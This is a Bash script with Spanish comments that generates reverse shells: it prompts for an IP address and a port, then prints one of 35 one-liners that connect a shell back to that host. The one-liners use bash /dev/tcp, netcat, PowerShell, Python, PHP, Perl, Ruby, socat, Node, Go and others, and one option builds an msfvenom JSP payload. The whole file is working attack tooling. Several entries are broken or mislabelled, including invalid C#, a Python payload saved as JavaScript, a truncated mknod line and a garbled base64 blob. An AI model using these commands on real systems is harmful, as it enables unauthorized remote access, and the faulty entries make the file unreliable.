#!/bin/bash

# Función para imprimir las opciones de Reverse Shell disponibles
function opciones {
    echo "Opciones de Reverse Shell disponibles:"
    echo "1. Bash"
    echo "2. Netcat"
    echo "3. nc mkfifo"
    echo "4. nc -e"
    echo "5. nc.exe -e"
    echo "6. ncat -e"
    echo "7. curl"
    echo "8. rustcat"
    echo "9. c"
    echo "10. c windows"
    echo "11. c# tcp client"
    echo "12. c# bash -i"
    echo "13. perl"
    echo "14. php"
    echo "15. php cmd"
    echo "16. php system"
    echo "17. windows conpty"
    echo "18. Powershell"
    echo "19. Powershell (TLS)"
    echo "20. Powershell (base64)"
    echo "21. Python"
    echo "22. Ruby"
    echo "23. socat"
    echo "24. socat (TTY)"
    echo "25. Crystal"
    echo "26. sqlite3 nc mkfifo"
    echo "27. node.js"
    echo "28. Java"
    echo "29. Java Web"
    echo "30. Javascript"
    echo "31. Groovy"
    echo "32. Telnet"
    echo "33. Zsh"
    echo "34. Lua"
    echo "35. Golang"
}

# Imprimir las opciones de Reverse Shell disponibles
opciones

# Leer la opción seleccionada por el usuario
read -p "Seleccione el número de la opción de Reverse Shell que desea generar: " opcion

# Leer la dirección IP
read -p "Ingrese la dirección IP: " ip

# Leer el puerto
read -p "Ingrese el puerto: " puerto

# Generar el comando de Reverse Shell correspondiente
case $opcion in
    1) echo "bash -i >& /dev/tcp/$ip/$puerto 0>&1";;
    2) echo "nc -e /bin/sh $ip $puerto";;
    3) echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $puerto >/tmp/f";;
    4) echo "nc $ip $puerto -e /bin/sh";;
    5) echo "nc.exe -e cmd.exe $ip $puerto";;
    6) echo "ncat $ip $puerto -e /bin/sh";;
    7) echo "curl $ip:$puerto | /bin/bash";;
    8) echo "rustcat $ip $puerto --exec /bin/sh";;
    9) echo "rm -f /tmp/p; mknod /tmp/p p && nc $ip $puerto 0/tmp/p";;
    10) echo "nc.exe -e cmd.exe $ip $puerto";;
    11) echo "csharp -e cmd=System.Net.Sockets.TcpClient(\"$ip\",$puerto);";;
    12) echo "csharp -e cmd=System.Diagnostics.Process.Start(\"/bin/bash\",\"-c\",\"$ip $puerto\");";;
    13) echo "perl -e 'use Socket;$i=\"$ip\";$p=$puerto;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";;
    14) echo "php -r '\$sock=fsockopen(\"$ip\",$puerto);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";;
    15) echo "php -r '\$sock=fsockopen(\"$ip\",$puerto);shell_exec(\"/bin/bash -i <&3 >&3 2>&3\");'";;
    16) echo "php -r '\$sock=fsockopen(\"$ip\",$puerto);system(\"/bin/bash -i <&3 >&3 2>&3\");'";;
    17) echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'";;
    18) echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$puerto);\$stream=(New-Object System.IO.StreamReader((New-Object System.Net.Sockets.TCPClient(\"$ip\",$puerto)).GetStream()));[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte=[text.encoding]::ASCII.GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};";;
    19) echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$puerto);\$stream=(New-Object System.IO.StreamReader((New-Object System.Net.Sockets.TCPClient(\"$ip\",$puerto)).GetStream()));[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte=[text.encoding]::ASCII.GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};";;
    20) echo "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand JABzAD0AcgBvAGwAdQBlAH0AJgBzACgAJABpAD0AXAB7ACQAbgBhAG0AZQAgAD0ATgBlAHQALgBXAGUAYgBjAGUALQBPAGIAagBlAGMAdAAgAFMAdAByAGUAYQBtACgAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQwBvAG4AdABlAG4AdAAoACkALAAkAHAAcgBvAHAAKQApADsAJABzdHJlYW0APQBoAHQAdABwADsAdwBpAG4AZABhAHQAIABzAG8AdQBsAGwAKABOAGUAdAAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAG4AdgBhAGwAdAAoACkALgBHAGUAdABTAHQAcgBhAG0ALgBUAGUAYQBwAGUAKABOAGUAdAAtAE8AYgBqAGUAYwB0ACkALgBHAGUAdABTAHQAcgBhAG0ALgBUAGUAYQBwAGUAKAApACkAOwBbAGIAeQB0AGUAcgBdAFsAdABlAHgAdAAuAGUAbgB0AGkAZQBuAHQAKABJAH4AdwBzAC4AVABlAGcAdQBsAGwALgBBU0NJAA==";;
    21) echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$puerto));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";;
    22) echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$puerto).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";;
    23) echo "socat tcp-connect:$ip $puerto exec:/bin/sh,pty,stderr,setsid,sigint,sane";;
    24) echo "socat file:`tty`,raw,echo=0 tcp-connect:$ip $puerto";;
    25) echo "crystal tcp.cr $ip $puerto";;
    26) echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $puerto >/tmp/f";;
    27) echo "nodejs -e 'const net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []);const client = new net.Socket();client.connect($puerto, \"$ip\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;";;
    28) echo "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip/$puerto;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor();";;
    29) echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$puerto -f raw > shell.jsp";;
    30) echo "echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$puerto));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.js && node shell.js";;
    31) echo "echo 'String host=\"$ip\";int port=$puerto;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};s.close();p.destroy();' > shell.groovy && groovy shell.groovy";;
    32) echo "telnet $ip $puerto | /bin/bash | telnet $ip $puerto";;
    33) echo "zsh -c 'zmodload zsh/net/tcp && ztcp $ip $puerto && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'";;
    34) echo "lua -e 'require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"$ip\",\"$puerto\");os.execute(\"/bin/sh -i <&3 >&3 2>&3\");'";;
    35) echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$ip:$puerto\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();}' > shell.go && go run shell.go";;
    *) echo "Opción no válida";;
esac
